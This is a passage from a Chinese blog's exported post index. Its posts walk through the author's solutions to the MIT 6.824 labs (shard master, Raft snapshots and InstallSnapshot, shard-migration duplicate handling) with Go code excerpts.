apply了请求append{key：A,value：123，clientId:1，opnum:20}，由问题3的解法知，gid100仍然执行了append请求，同时更新applyNum[1]=20，并返回一个ErrWrongGroup给client1，让client1重新发送这个append请求给gid101 但此时，在gid101还未接收到client1重发的append请求之前，新的config又来了，这次数据A要立即从gid101再转移回到gid100，这时由于我在ApplyNewConfig函数中使用覆盖的方式更新DB，那么gid.DB[A]从“0123”再次被覆盖为”0，但是由于applyNum=max（rf.applyNum,args.applyNum)，那么applyNum[1]仍然保留为20。 这样的话我们的DB信息和applyNum就出现了不匹配的情况，此时client1又重新发送append{key：A,value：123，clientId:1，opnum:20}给gid100，但是由于applyNum[1]=20，这个请求被判定为request dup，不会被执行。这就导致了数据A缺失了”123”这个部分的信息 我一开始想到了多个思路解决这个方法，让我们一一来想一想它们的可行性： （1）在问题3中，我们对于“过时”的请求选择不执行，直接返回ErrGroup。这样gid100中applyNum就不会更新到20，请求就不会被判定为request dup，而是正确执行 这个解法看似正确，但是这只是对于leader而言，我们知道ShardMigration中是由leader来交接分片，那么我们上述的思路只能保证在leader中的正确性。但是对于每一个follower而言，它们更新config的时间点和leader不同（apply的时间点相同，但是更新不一定相同）可能这个请求在apply到shardkv时，它们的config还未更新，那么这个请求就不是”过时”的，它们会执行这个请求。在部分follower执行了这个请求后，我们又走上了错误的道路- - 另一方面看，选择不执行“过时”的请求可能导致leader和follower的不一致，所以我选择执行“过时”请求使leader和follower都执行了相同的请求，保持了它们的一致 （2）在ApplyNewConfig函数中，将applyNum=max（rf.applyNum,args.applyNum) 改为applyNum=args.applyNum 很显然这一定不对…因为这样会影响其他正常的client发送的请求，造成回退，进一步导致request dup 在摒弃了上面两种我认为不可行的方法后，我选择了如下方法 使用新的数据结构ErrGroupApply(clientId-&gt;key)来记录与“过时”请求相关的分片和clientId 123456789//在apply中添加代码if err==ErrWrongGroup&#123; kv.ErrGroupApply[op.ClientId]=Command.Key //记录这次过时请求的clientId和key&#125;else&#123; delete(kv.ErrGroupApply,op.ClientId)//执行正常时删除clientId和对应的key//因为这一次会正常的执行说明之前的请求都被正确处理了&#125; 另一方面我们需要向ApplyNewConfig中添加一些代码 123456789for k,v:=range kv.ErrGroupApply&#123; if args.ApplyNum[k]&lt;kv.applyNum[k]&#123;//如果我的applyNum[clientId]更大，并且ErrGroupApply[clientId]存在说明出现//出错情况，那么我们就在args中把这个applyNum和对应的部分数据删除，防止错误覆//盖 delete(args.ApplyNum,k) delete(args.State,v) &#125;&#125; 仅仅是这样还不够，这可能造成新的错误，所以我们也需要修改ShardMigration 123456789//ShardMigration中传递applyNum的部分代码for index,v:=range kv.applyNum&#123; shd,ok:=kv.ErrGroupApply[index] if ok &amp;&amp; args.Shards!=(int(shd[0])%shardmaster.NShards)&#123; reply.ApplyNum[index]=v-1 &#125;else&#123; reply.ApplyNum[index]=v &#125;&#125; 因为在ShardMigration中，无论请求的分片是什么，我们都会将全部client对应的applyNum传递出去。 而修改shardMigration是为了防止 分片请求者没有更新对应errGroup shard，但是却获得了对应的ApplyNum造成与问题4相同的错误。 最后要记得将ErrGroupApply存入Snapshot，并修改restoreSnapshot和checkLogLength 坦白来说，我觉得我对于问题4的解决方法并不好，基本是属于简单的亡羊补牢类型的debug，但是由于我中期划水，导致我在6.824lab上花费了过多的时间，所以只能是以完成主要部分为主，不进行过多的设计优化 总结 到此为止MIT6.824的lab就完成了，虽然在细节上有很多的不足，但是我认为以我目前的水平能够基本完成测试点覆盖的大多数情况就足够了，进一步的代码优化任务就取决于以后的我了。","categories":[{"name":"mit6.824","slug":"mit6-824","permalink":"http://yoursite.com/categories/mit6-824/"}],"tags":[]},{"title":"MIT-6.824-lab4A-The Shard Master","slug":"mit-6-824-4a-shardmaster","date":"2020-04-10T14:22:25.000Z","updated":"2020-08-30T04:44:55.480Z","comments":true,"path":"2020/04/10/mit-6-824-4a-shardmaster/","link":"","permalink":"http://yoursite.com/2020/04/10/mit-6-824-4a-shardmaster/","excerpt":"","text":"https://github.com/wwow1/MIT-6.824 在lab4中，我们将要搭建一个基于分片的kv存储系统，这个系统的工作流程稍微有一点复杂，我看了好几遍说明才看懂- -，同时也参考了一些网上的说明。 简而言之分片（shard）就是将我们要保存的数据分割成多份，然后将这些分片分发给下层的不同个raft集群，每一个raft集群负责多个分片的保存和响应对应的数据操作，同时为了管理这些不同的raft集群，在多个raft集群之上还需要增加一个用于管理分片和集群配置的raft集群，这个集群称为shardmaster 大家也许会想问分片是按照什么方法进行分割的呢？我认为具体的方法是由使用者决定的，在lab4中，由于保存的key-value全都是string变量，同时分片数量确定为10个，所以分配规则为 int(key[0])%10 这是我在网上看到的一个非常简单易懂的图片说明，取自https://www.jianshu.com/p/6e8d33c3c799 在lab4A中，我们只需要完成shardmaster部分，不涉及具体的分片数据管理 我们主要需要在shardmaster中为上层服务器提供4种服务，分别是 Join：将新的raft集群加入到配置中，同时需要保证在新raft集群加入后，集群中的分片分配是平均合理的 Leave：将先前存在于配置中的raft集群排出到集群之外，同样的，在新的集群中也要实现分片分配的平均合理 Move：将指定的分片分配给指定的某个raft集群 Query：给定一个配置号，返回对应编号的配置信息，如果配置号为-1或大于存在的所有配置号就返回最新的配置信息 这4个功能的具体参数和说明都在6.824的网站上有，这里只是简略的说明功能，在实现的时候还是要认真的查看要求和参数 Client部分 我们首先开始实现shardmaster的client，shardmaster的client中，对于4个功能的client端的调用已经完善，我们不需要更改，主要是做Clerk的初始化和Clerk变量的添加，这里可以仿照lab3的做法，首先为了防止请求重复执行，我们需要一个opnum来为当前发送的请求加上编号，同时为了支持多client操作，我们需要为每个clerk生成一个clientId。 123456type Clerk struct &#123; servers []*labrpc.ClientEnd opnum int mu sync.Mutex clientId int64&#125; Common部分 然后我们需要修改common.go中的RPC结构变量，只需要在每个–Args中添加Opnum和ClientId就行，非常简单，这里就不贴图了 12345type Config struct &#123; Num int // config number Shards [NShards]int // shard -&gt; gid Groups map[int][]string // gid -&gt; servers[]&#125; 既然提到了common.go，我们就来说一说配置结构Config，首先Num是用于标识当前的Config编号（从1开始），然后是记录分片所属的Shards数组，Shards数组有10个int值，在我们的lab中，使用到的数据被分为10个分片，而Shards则表示分片号和当前管理它们的集群的集群号gid的映射关系 Server部分 最后我们要填写server中的内容，首先是ShardMaster的结构，为了确定Start的log是否apply成功，我们需要加入applyMsg；为了保存每一次apply的结果，需要加入applyCheck；为了保存从头到尾的全部配置信息，我们需要加入configs 1234567891011type ShardMaster struct &#123; mu sync.Mutex me int rf *raft.Raft applyCh chan raft.ApplyMsg // Your data here. applyMsg map[int64]map[int]Msg applyCheck map[int64]map[int]Config configs []Config // indexed by config num&#125; 首先我们来一一完善Join，Leave，Move，Query这4个RPC 在lab3中，对于client的RPC请求Get和PutAppend，我们首先将它们start给下层的raft，在raft确保一致性之后，再apply到上层，由上层进行具体apply操作。 这里也是一样，我们要将这4种请求传入raft，在raft中保证了一致性之后，再回到当前执行它们 需要确认传入到raft中的结构，在lab3和lab4中都命名为Op 123456type Op struct &#123; Operation string //&quot;join&quot; &quot;leave&quot; &quot;move&quot; &quot;query&quot; Opnum int Args interface&#123;&#125; ClientId int64&#125; 主要需要说明一个Args，它必须为一个interface{}类型，因为Join，Leave，Move，Query的参数各不相同，只有interface{}才能够接纳它们 然后在各自函数中将需要使用到的变量打包进入Op，所有内容大致相同，唯一不一样的就是Args，要根据传入的参数来打包 12345678910func (sm *ShardMaster) Join(args *JoinArgs, reply *JoinReply) &#123; Tmp:=make(map[int][]string) for k,s:=range args.Servers&#123; Tmp[k]=make([]string,len(s)) copy(Tmp[k],s) &#125; op:=Op&#123;&quot;Join&quot;,args.Opnum,Tmp,args.ClientId&#125; tmpReply:=sm.StartLog(op) reply.WrongLeader=tmpReply.WrongLeader&#125; 12345func (sm *ShardMaster) Leave(args *LeaveArgs, reply *LeaveReply) &#123; op:=Op&#123;&quot;Leave&quot;,args.Opnum,args.GIDs,args.ClientId&#125; tmpReply:=sm.StartLog(op) reply.WrongLeader=tmpReply.WrongLeader&#125; 123456func (sm *ShardMaster) Move(args *MoveArgs, reply *MoveReply) &#123; LogArgs:=MoveLogArgs&#123;args.Shard,args.GID&#125; op:=Op&#123;&quot;Move&quot;,args.Opnum,LogArgs,args.ClientId&#125; tmpReply:=sm.StartLog(op) reply.WrongLeader=tmpReply.WrongLeader&#125; 123456func (sm *ShardMaster) Query(args *QueryArgs, reply *QueryReply) &#123; op := Op&#123;&quot;Query&quot;, args.Opnum, args.Num, args.ClientId&#125; tmpReply:=sm.StartLog(op) reply.WrongLeader=tmpReply.WrongLeader reply.Config=tmpReply.Configuration&#125; 在填充了Op结构之后，就将其传入StartLog函数中，这个函数用于统一调用raft.Start函数，StartLog的具体实现基本可以照搬lab3中Get和Append的实现方法。 之后我们需要编写server中的Apply函数，这里的实现也是基本照搬lab3的内容，实际上思路也差不多，但是不同的是在apply的具体执行时，要跳转到对应的RPChandler函数进行具体的处理 12345678910111213141516171819if op.Operation==&quot;Join&quot;&#123; servers:=(op.Args).(map[int][]string) sm.JoinHandler(servers) sm.applyCheck[op.ClientId][op.Opnum]=Config&#123;&#125; _,ok=sm.applyCheck[op.ClientId][op.Opnum]&#125;else if op.Operation==&quot;Leave&quot;&#123; GIDs:=(op.Args).([]int) sm.LeaveHandler(GIDs) sm.applyCheck[op.ClientId][op.Opnum]=Config&#123;&#125;&#125;else if op.Operation==&quot;Move&quot;&#123; moveMsg:=(op.Args).(MoveLogArgs) sm.MoveHandler(moveMsg) sm.applyCheck[op.ClientId][op.Opnum]=Config&#123;&#125;&#125;else if op.Operation==&quot;Query&quot;&#123; num:=(op.Args).(int) sm.applyCheck[op.ClientId][op.Opnum]=sm.QueryHandler(num)&#125;else&#123; fmt.Println(&quot;unkonwn operation type &quot;+op.Operation)&#125;//Apply中的部分代码 最后我们需要一一编写RPC Handler函数 我们先从简单的开始，首先是QueryHandler，如果传入的参数num为-1或者大于当前最大的config.num，就返回最后一个config，否则就返回对应下标的config 1234567func (sm *ShardMaster) QueryHandler(num int) Config&#123; if num==-1 || num&gt;=len(sm.configs)&#123; return sm.configs[len(sm.configs)-1] &#125;else&#123; return sm.configs[num] &#125;&#125; 然后是MoveHandler函数，首先我们创建一个新的config，然后将上一个config的内容全部复制过来，唯一要改动的就是Shard[args.Shard]要改为指定的args.GID 123456789101112131415161718func (sm *ShardMaster) MoveHandler(args MoveLogArgs)&#123; lastConfig:=len(sm.configs)-1 newConfig:=Config&#123;&#125; newConfig.Num=lastConfig+1 newConfig.Groups=make(map[int][]string) for k,v:=range sm.configs[lastConfig].Groups&#123; newConfig.Groups[k]=make([]string,len(v)) copy(newConfig.Groups[k],v) &#125; for i:=0;i&lt;NShards;i++&#123; if i==args.Shard&#123; newConfig.Shards[i]=args.GID &#125;else&#123; newConfig.Shards[i]=sm.configs[lastConfig].Shards[i] &#125; &#125; sm.configs=append(sm.configs,newConfig)&#125; 然后就是比较麻烦的LeaveHandler和JoinHandler，因为它们在更改集群成员的同时，需要对Shards进行再分配，并且要求在移动分片尽量少的情况下保证分片分配的平均。所以我们就需要思考对应的分片分配策略 LeaveHandler 1.首先将确定要保留的Group移到新的config中，这些保留的Group所维护的分片不应改变（尽量少移动分片），同时将这些Group计入remainGroupCircle数组（gid数组）中，并使用remainShard（gid-&gt; shard num) 记录它们现在维护的分片数量 2.根据remainShard的值从小到大给remainGroupCircle数组排序，然后将被移除的Group所维护的分片按照remainGroupCircle中的顺序循环分配给保留的Group们 稍微解释一下第二个步骤，由于我们确定上一次配置中的分片分配是平均的，所以保留的Group们所负责的分片数量应该是平均的，那么我们只需要将剩余的分片也平均分配就行了。 但是这里的平均只是相对的，对于10个分片，我们要将它分配给4个Group，那么2（gid100)，2(gid101)，3(gid102)，3(gid103)就是一种较为平均的分配方式，假设gid100退出集群，那么为了维持平均，我们不应该将这两个分片分给gid102和gid103，这将造成2（gid101），4（gid102），4（gid103）这种不平均的局面，而应该优先考虑把分片分配给分配数量最少的gid101，这也是为什么在分配前要根据remainShard排序的原因 JoinHandler 1.将新加入的Groups和保留的Groups一起加入新集群，同时记录新加入的Group个数newGroupnum以及保留的Group个数remainGroupnum 2.计算每个Group现在负责的分片数并保留到数组remainShard（gid-&gt;shard num)，计算出在新的配置中每个集群应负责的分片数量assignShards（只能整除），以及在计算assignShards中由于整除而被“漏网”的分片数leftShards 12assignShards:=NShards/(remainGroupnum+newGroupnum)leftShards:=NShards-assignShards*(remainGroupnum+newGroupnum) 3.用remainShard减去assignShards 1234//这段代码与我的实际代码顺序不太一样，但是思路相同for k,v:=range sm.configs[lastConfig].Groups&#123; remainShard[k]-=assignShards&#125; 这样remainShards的意思就转变为每个Group要分发给新Group的分片数，但这还不准确，还有leftShards要处理，为了实现移动尽量少的分片，所以leftShards我们就保留在旧Group上 12345678910//根据remainShard逆序排列remainGroup，表示分出分片多的Group应该优先减少分发数sort(remainGroup,remainShard,false)ptr=0for leftShards&gt;0&#123; remainShard[remainGroup[ptr]]--//每次自减表示要分出的分片减少1个 ptr=(ptr+1)%len(remainGroup) leftShards--&#125; 4.每个旧Group根据remainShard为新Group循环分发分片，同时也将自己维护的分片信息写入新的配置中 123456789for i:=0;i&lt;NShards;i++&#123; if remainShard[sm.configs[lastConfig].Shards[i]]&gt;0 &amp;&amp; assignShards&gt;0&#123; //为新Group分发分片 newConfig.Shards[i]=newGroup[circlePtr] circlePtr=(circlePtr+1)%newGroupnum remainShard[sm.configs[lastConfig].Shards[i]]-- &#125;else&#123; //将属于旧Group的分片信息搬运到新配置中 newConfig.Shards[i]=sm.configs[lastConfig].Shards[i] &#125;&#125; 到此为止，lab4A的内容就结束啦，lab4A的难度还是较低的，因为很多地方的实现都可以仿照lab3A来做，唯一需要思考的应该只有Join和Leave的分片分配策略，接下来我们就要进去6.824的最后一部分lab4B，大家也要做好心理准备哈，4B的难度可就不像4A这么友善了（我太菜了- -","categories":[{"name":"mit6.824","slug":"mit6-824","permalink":"http://yoursite.com/categories/mit6-824/"}],"tags":[]},{"title":"MIT-6.824-lab3B-kvraft","slug":"mit-6-824-lab3b-kvraft","date":"2020-04-10T02:45:39.000Z","updated":"2020-08-30T04:45:50.334Z","comments":true,"path":"2020/04/10/mit-6-824-lab3b-kvraft/","link":"","permalink":"http://yoursite.com/2020/04/10/mit-6-824-lab3b-kvraft/","excerpt":"","text":"https://github.com/wwow1/MIT-6.824 在lab3B的实验中，我们需要为3A的key-value服务添加日志压缩功能，在lab2C中，为了使server在重启时能够恢复之前的状态，我们对Raft中的几个持久化变量以及log进行了持久化保存，但是随着server的不断运行，其Raft中log的内容也不断增加，这将会导致我们在持久化log内容的时候耗费大量的存储空间。为了改进这一情况，我们需要在kvraft中增加能够持久性保存当前状态的Snapshot，当kvraft的当前状态存入Snapshot后，我们就可以使Raft丢弃快照之前的log达到节省空间的目的。 在lab3B的测试中，将会传入一个MaxRaftState变量，它记录了当前允许的Raft持久化数据的最大值，当Raft持久化数据的容量大于MaxRaftState时，我们的kvraft就需要保存一个快照，并只是Raft丢弃旧的日志条目 这里有一点需要注意的是，在lab3B之前，我们都是使用Slice来保存Raft log的，但是使用Slice无法实现“丢弃旧的日志”这一功能，因为丢弃旧的日志后，新的日志的下标并不会重新从0开始计数，假设当前快照对应的最后一个LogIndex=n，那么下一个传入的log的index应该为n+1。所以在这里，我首先将保存log的容器改为map。 我本来以为将log改为map存储很简单，只需要修改对应的变量就行，但是还是遇到了一些小问题，例如Slice是支持多个线程同步访问的，但是map就不行，所以需要将代码中使用到log的部分加上锁。这里给大家推荐另外一种方法，直接使用sync.Map，这个数据结构会在使用时自动实现上锁的功能，就不需要在每次访问log的时候都去一一加锁。（一开始我也使用了Sync.Map,但是由于当时没弄懂gob.Register，所以在RPC调用的时候，传入的log直接变空值了，于是我就放弃了它- -） 这里特别提醒一下，如果大家使用LastLogIndex=len（rf.log）-1这个句子来得到LastLogIndex的话，那么一定要记得修改，因为换用map，同时加入了discard log功能后，len（rf.log）-1得到的值将小于真实的LastLogIndex。我建议还是使用遍历map的方法. 在完成了将log容器从Slice过度到Map之后，我们就可以开始编写Snapshot的相关代码了 1.Snapshot结构 首先我们需要确认，哪些数据需要被保存在Snapshot中？ 既然是通过Snapshot保存状态，那么当前保存的kv.DB信息肯定需要加入其中，然后还需要ApplyNum来保证在重启后不会发生request dup，最后是LastIncludedIndex和LastIncludedTerm保存Snapshot包含的最后一个log的Index和Term，通过这两个信息来指示Raft丢弃旧的log 123456type SnapShot struct&#123; State map[string]string //key-&gt;value ApplyNum map[int64]int //clientId-&gt;opnum LastIncludedIndex int LastIncludedTerm int&#125; 2.周期性地检查Raft持久化状态的长度（CheckLogLength) 我使用了一个CheckLogLength的函数来周期性的检测Raft状态的长度，一旦发现Raft状态长度超过了MaxRaftState，就需要保存一个新的Snapshot，需要提醒的就是map的赋值不能直接使用=，而是需要跑一个循环将每一个数据一一进行复制。 还有一个问题就是Snapshot中的LastIncludedIndex和LastIncludedTerm要如何确认？我使用了两个新的变量kv.commitIndex和kv.commitTerm来记录被kvraft apply的最后一个raft log，所以需要在apply()函数中增加代码来更新commitIndex和commitTerm 1234if op.Index&gt;kv.commitIndex&#123; //in apply() kv.commitIndex=op.Index kv.commitTerm=op.Term&#125; 在每次保存Snapshot的时候，就将当前的kv.commitIndex和kv.commitTerm作为LastIncludedIndex和LastIncludeTerm存入新的Snapshot中 在记录完Snapshot后，需要调用Raft中的函数丢弃旧log 3.使用Snapshot恢复状态（RestoreSnapshot） 在Server启动时，我们需要调用一个RestoreSnapshot函数来使用已经保存的Snapshot去恢复kvraft的状态。函数内容也很简单，把Snapshot中的数据解码之后复制给kvraft中对应的变量就行 到此为止，我们在kvraft程序中的修改就大致结束了，然后需要转移到raft中完成剩余的内容 4.Raft根据kvraft提供的信息丢弃旧log（DiscardLog） 由kvraft中的CheckLogLength调用raft中的DiscardLog函数来丢弃旧log 调用者应该需要提供LastIncludedIndex以及LastIncludedTerm，DiscardLog根据LastIncludedIndex对自己的log进行一轮遍历，丢弃所有index&lt;LastIncludedIndex的log，同时在Raft中也需要添加LastIncludedIndex和LastIncludedTerm两个变量（具体用处后面会说），说明一下这里更新lastApplied的操作其实是多余的，当时编写的时候没有去除掉。 12345678910for i:=1;i&lt;=LastIncludedIndex;i++&#123; //in discardLog() _,ok:=rf.log[i] if ok &#123; delete(rf.log,i) &#125;&#125;rf.lastIncludedIndex=LastIncludedIndexrf.lastIncludedTerm=LastIncludedTermrf.lastApplied=max(rf.lastApplied,rf.lastIncludedIndex)rf.persist() 1234567891011121314151617181920212223242526272829type Raft struct &#123; # new Raft struct mu sync.Mutex // Lock to protect shared access to this peer&#x27;s state peers []*labrpc.ClientEnd // RPC end points of all peers persister *Persister // Object to hold this peer&#x27;s persisted state me int // this peer&#x27;s index into peers[] applyCh chan ApplyMsg electionTimeout int leaderId int t *time.Timer currentTerm int //persistent state votedFor int log map[int]Entry //lastIncludedTerm int lastIncludedIndex int lastIncludedTerm int commitIndex int //volatile state on all servers lastApplied int lastLogIndex int outdate bool nextIndex []int//valatile state on leader matchIndex []int preSnapShotIndex []int killCh chan bool&#125; 在完成了前面4个内容之后，一个基本的日志压缩功能就实现了。但是大家也许会发现一个很严重的问题。假设现在Raft leader有50个log，并且这50个log都被压缩为Snapshot了，那么此时它的rf.log应该是空的，如果这时候有新的follower加入集群或者是某些follower刚才掉线了如今重新加入集群，那么大概率它们的log没有达到这50个，但是我们的leader由于执行了日志压缩，leader的log已经是空的了，那leader肯定没办法通过AppendEntries为这些“掉队”的follower发送它们缺少的log，那这不就会造成不一致了吗？ 为了解决这个问题，我们还需要在raft中实现InstallSnapshotRPC，允许leader通过这个RPC发送它的Snapshot给follower，只要follwer直接保存了leader的Snapshot，那么它就不用请求缺失的log，而是直接跳跃到了leader的状态。 5.leader使用InstallSnapshotRPC向follower发送新的Snapshot（InstallSnapshot） 首先定义InstallSnapshotRPC的Args和reply 12345678type InstallSnapshotArgs struct&#123; Term int LeaderId int LeaderSnapShot []byte&#125;type InstallSnapshotReply struct&#123; Term int&#125; 主要内容是leader的Snapshot数据，其次是LeaderId和Term，这几个变量的用处和lab2中的VoteRequestRPC和AppendEntriesRPC中作用一样，这里就不多说了。 然后我们要编写InstallSnapshotRPC handler，首先RPC的标准部分，判断agrs.term和rf.term，然后…….（RPC基本操作） 之后我们需要对LeaderSnapshot进行解码，这里主要是为了得到Snapshot中的leader.LastIncludedIndex（这里的leader是伪代码，表示leader的成员变量，下同），因为InstallSnapshotRPC的调用和实现都是在raft中，没有与上层kvraft进行交互，所以要得到Snapshot中的LastIncludedIndex只能通过直接解码得到。 然后进行一个判断，当前follower的lastIncludedIndex是否小于LeaderSnapshot的（代码中的tmp.LastIncludedIndex）： 如果不小于，说明这个follower已经拥有跟LeaderSnapshot一样新的Snapshot了，那么函数直接返回 如果小于，那么需要使用LeaderSnapshot更新follower的Snapshot，首先将LeaderSnapshot通过ApplyCh传入kvraft层，让kvraft应用这个Snapshot，并且调用SavaSnapshot保存这个新的Snapshot。之后修改自己的LastIncludedIndex和LastIncludedTerm。 我们还需要根据follower当前的log信息决定如何丢弃旧log，首先判断rf.log[tmp.LastIncludedIndex].Term==tmp.LastIncludedTerm（tmp是指解码后的数据），如果条件为true，说明对于follower而言，它在LastIncludedIndex之前的log都是正确的，那么只需要丢弃在这之前的log就行；如果条件为false，说明不能保证LastIncludedIndex之前，甚至这之后的log是否正确，那么旧需要丢弃全部的log。如果需要丢弃全部log，我们也需要使用LastIncludedIndex来修改rf.lastLogIndex和rf.commitIndex 最后需要修改lastApplied的信息，这一点比较重要，更新了Snapshot相当于整个follower apply了所有LastIncludedIndex之前的log。反之不修改lastApplied的话，下一次apply的时候会apply nil（因为对应下标的log是空的） 12345678910111213141516171819202122232425262728//RPC handler的主要部分if rf.lastIncludedIndex&lt;tmp.LastIncludedIndex&#123;//replace the old snapshot and apply the snapshot to kvraft rf.applyCh&lt;-ApplyMsg&#123;tmp.LastIncludedIndex,nil,tmp.LastIncludedTerm,true,args.LeaderSnapShot&#125; rf.persister.SaveSnapshot(args.LeaderSnapShot) rf.mu.Lock() rf.lastIncludedIndex=tmp.LastIncludedIndex rf.lastIncludedTerm=tmp.LastIncludedTerm if rf.log[tmp.LastIncludedIndex].Term==tmp.LastIncludedTerm&#123; fmt.Printf(&quot;%v clear log before %v\\n&quot;,rf.me,tmp.LastIncludedIndex) for i:=1;i&lt;=tmp.LastIncludedIndex;i++&#123; _,ok:=rf.log[i] if ok &#123; delete(rf.log,i) &#125; &#125; &#125;else&#123; fmt.Printf(&quot;%v clear all log entries\\nlastIncludedIndex=%v\\n&quot;,rf.me,tmp.LastIncludedIndex) rf.log=make(map[int]Entry) rf.log[0]=Entry&#123;-1,0&#125; rf.lastLogIndex=tmp.LastIncludedIndex rf.commitIndex=tmp.LastIncludedIndex &#125; rf.persist() rf.mu.Unlock() rf.lastApplied=max(tmp.LastIncludedIndex,rf.lastApplied)&#125; 6.决定发送InstallSnapshotRPC的时机 决定发送InstallSnapshotRPC的时间点非常重要，如果一个follower没有leader.LastIncludedIndex之前的log，但是leader仍然向它发送了AppendEntriesRPC，那么这个follower不会得到中间这一段它缺失的log，但是却会更新它的commitIndex，那么它的applyEntry函数就会更具下标来apply这些缺失的log（也就是nil），造成错误。 根据以上例子我们首先判断知道，如果需要发送InstallSnapshotRPC，那么它一定要在AppendEntriesRPC之前，所以我们首先在Start函数中加入一段发送InstallSnapshotRPC的代码 12345678910111213//在start()中判断是否发送RPCif rf.lastIncludedIndex&gt;rf.matchIndex[server]&#123; //install Snapshot ok:=rf.sendInstallSnapshot(server) if ok&#123; rf.mu.Lock() rf.matchIndex[server]=max(rf.lastIncludedIndex,rf.matchIndex[server]) rf.nextIndex[server]=max(rf.lastIncludedIndex+1,rf.nextIndex[server]) rf.mu.Unlock() &#125;else&#123; return &#125;&#125; 对于leader而言，它并不能准确的知道每个follwer log的具体情况，那么就使用matchIndex来作为follower log的更新情况，如果leader.lastIncludedIndex&gt;leader.matchIndex[server]，那么说明这个follower需要更新Snapshot，那么就对它发送InstallSnapshot，如果RPC成功那么就需要修改对应的matchIndex和nextIndex。 如果RPC失败，那么我们就应该直接返回，而不应该向下走，否则会导致apply nil（上面提到过这种情况） 在Start添加了InstallSnapshotRPC后，这里还有一点不足，就是如果上层的kvraft没有新的请求，在Start不被调用时，follower就无法通过leader的InstallSnapshotRPC在更新自己，所以我决定在HeartBeat中也加入发送InstallSnapshotRPC的判断。（程序段内容同上） 7.kvraft应用被apply的Snapshot 在InstallSnapshot中我们将新的Snapshot传入applyCh，那么在kvraft处，也需要编写函数来处理这个请求。由于在ApplyMsg中有一个UseSnapshot的bool量来标识当前请求是否是Snapshot，所以我们只需要在kvraft的apply()函数处增加一处判断和对应的处理程序就行。 123456//server中apply Snapshotif op.UseSnapshot==true&#123; fmt.Printf(&quot;useSnapShot index:%v\\n&quot;,op.Index) _=kv.RestoreSnapShot(op.Snapshot) continue&#125; 在apply Snapshot的时候想到了一个问题，从raft apply的Snapshot是否一定要调用RestoreSnapshot？ 假如当前kvraft的状态更新，那么应用了这个Snapshot不就出错了吗？虽然可以知道一开始Leader发送InstallSnapshotRPC的时候就是认为这个follower不含有该Snapshot对应的log，但是这个想法也许并不准确（根据matchIndex来判断是否发送RPC），所以为了防止应用Snapshot出错，我又在RestoreSnapshot中增加了一层条件保护 1234//kvraft：RestoreSnapshot中的条件保护if kv.commitIndex&gt;tmp.LastIncludedIndex&#123; return false&#125; 因为我们前面提到了kvraft中的commitIndex指的是已经应用的log Index，那么如果它的值大于Snapshot中的LastIncludedIndex，就说明当前kvraft的状态比Snapshot中的状态更新。到这里 8.对原有raft代码的修改 完成了以上步骤之后，看似已经完成了lab3B，其实不然，真正的debug之路才刚刚开始（心态爆炸），在加入了discard log这一内容之后，我们原有的raft代码将不再适用于此，需要做许多改进和保护，否则根本跑不动= = 首先是对RequestVoteRPC的修改 我们知道，在RequestVoteRPC中，follower向candidate的条件是 1.candidate.lastLogTerm&gt;follower.LastLogTerm 2.candidate.LastLogTerm=follower.LastLogTerm &amp;&amp; candidate.LastLogIndex&gt;=follower.LastLogIndex 这里就需要考虑一种情况，follower或者Candidate的log因为更新Snapshot而被全部清空，那么我们就不能像原来一样使用rf.log[rf.lastLogIndex].Term来得到它们的LastLogTerm，因为这样得到的Term一定为0，这样就会导致出错，在这种情况下正确的做法应该是使用lastIncludedTerm来作为LastLogTerm参与判断（这也是为什么我们在raft中要保存这个变量的原因） 那么在发送RequestVoteRPC之前，就需要对follower传入RPC的LastLogTerm做一个保护 12345678//发送RequestVoteRPC前，对Candidate.LastLogIndex做保护if rf.lastIncludedIndex&gt;=rf.lastLogIndex&#123; lastLogIndex=rf.lastIncludedIndex lastLogTerm=rf.lastIncludedTerm&#125;else&#123; lastLogIndex=rf.lastLogIndex lastLogTerm=rf.log[rf.lastLogIndex].Term&#125; 另一方面，在执行RequestVote时，也需要对follower的LastLogIndex做保护 12//效果同上，只是写法略微不同lastLogTerm:=max(rf.log[rf.lastLogIndex].Term,rf.lastIncludedTerm) 然后是对AppendEntriesRPC的修改 首先是AppendEntries中的一致性判断，一个leader在刚上位时，它的matchIndex[all]=0，但其他follower的log大概率不是空的（也许经过更新Snapshot的方法导致log变空，但它的新log下标并不是重新从1开始），那么Leader发送的AppendEntries中PrevLogIndex=1；假设follower经历了一次Snapshot，它的log中只保存了index&gt;10的log，那么按照之前的做法，我们会得到follower.log[1].Term=0（因为follower下标为1的log已经被丢弃了），这时leader会认为这个follower的日志跟自己的不一致，那么就引发了错误（这会造成死循环，因为leader不存在term=0的log，它们永远不会匹配成功） 为了解决这种情况，我们应该要在AppendEntriesRPC的一致性判断中加入一个条件。 即如果args.PrevLogIndex&lt;rf.lastIncludedIndex，那么就应当认为这个follower在PrevLogIndex之前的log全部与leader一致（保存为Snapshot的log的一致性已经被确认过了） 在完成了AppendEntries的一致性判断后，我们还需要更改prevLogIndex，否则后续的Append过程会由于 rf.log[prevLogIndex+1].Term≠leader.log[prevLogIndex,导致follower的log被全部清空，所以在执行append之前需要修改一下prevLogIndex 12//确保在后续append过程中，不会有空log参与判断prevLogIndex:=max(args.PrevLogIndex,max(rf.lastIncludedIndex,args.LeaderLastIncludedIndex)) 在完成以上修改后，我们发现一个共性，那就是这些问题都是由于更新Snapshot时丢弃了旧Log，但raft仍然使用discardLog.Term，导致出错。 那么我们是不是想一些更简单的做法，比如在一个新的leader上任时，使它的所有matchIndex=leader.LastIncludedIndex，这样传入AppendEntriesRPC的prevLogIndex对应的log就不会是空值了。 到这里，lab3B的解析终于结束了，事实我在整个lab中，花费在lab3B的时间应该是最多的（一部分原因是因为那段时间划水严重），不断的debug，每天看着满屏的日志信息都头大，但是最终还是把遇到的bug一个个解决掉了（可能？），建议大家在遇到头大的bug的时候不要硬刚，可以做点其他事情（无限活力！！！）放松一下，不然很容易陷入焦躁，但是却完全改不出bug的困境中。","categories":[{"name":"mit6.824","slug":"mit6-824","permalink":"http://yoursite.com/categories/mit6-824/"}],"tags":[]},{"title":"MIT-6.824-lab3A-kvraft","slug":"mit6-824-lab3-kvraft","date":"2020-03-12T03:52:05.000Z","updated":"2020-08-30T04:46:24.446Z","comments":true,"path":"2020/03/12/mit6-824-lab3-kvraft/","link":"","permalink":"http://yoursite.com/2020/03/12/mit6-824-lab3-kvraft/","excerpt":"","text":"github地址：https://github.com/wwow1/MIT-6.824 lab3的任务是在lab2完成的Raft上构建容错的key-value存储服务。本质上就是使用lab3对应的Put，Append，Get命令来维护一个图，但是在维护过程中使用的这三条命令需要通过Raft来保证一致性。 Part A: Key/value service without log 